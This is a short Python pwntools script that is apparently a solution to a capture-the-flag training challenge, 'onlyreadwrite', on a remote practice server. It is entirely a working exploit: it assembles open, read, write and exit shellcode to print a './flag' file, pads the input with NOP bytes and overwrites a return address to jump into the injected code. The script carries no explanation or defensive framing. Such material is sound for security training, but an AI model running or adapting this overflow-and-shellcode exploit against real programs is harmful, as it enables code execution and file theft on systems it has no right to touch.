# ncat bin.training.jinblack.it 2006

import sys
from pwn import *
from pwn import p64

if "--remote" in sys.argv:
    p = remote("bin.training.jinblack.it", 2006)
else:
    p = process("./onlyreadwrite")

if "--debug" in sys.argv:
    context.terminal = ["terminator", "-e"]
    gdb.attach(p, """
    b *0x6020c7
    """)

shellcode_open = asm("""
mov rax, 2
mov rdi, 0x6020c0
mov rsi, 0
mov rdx, 0
syscall
""", arch='amd64')

shellcode_read = asm("""
mov rdi, rax
mov rax, 0
mov rsi, 0x6020c0
add rsi, 500
mov rdx, 60
syscall
""", arch='amd64')

shellcode_write = asm("""
mov rax, 1
mov rdi, 1
mov rsi, 0x6020c0
add rsi, 500
mov rdx, 60
syscall
""", arch='amd64')

shellcode_exit = asm("""
xor rax, rax
mov rax, 0x3c
mov rdi, 0
syscall
""", arch='amd64')

payload = b"./flag\0\0"
payload += shellcode_open
payload += shellcode_read
payload += shellcode_write
payload += shellcode_exit
payload = payload.ljust(1008 + 8, b"\x90")
payload += p64(0x6020c0 + 8)

p.sendafter(b"What is your name?\n", payload)
print(p.recvall())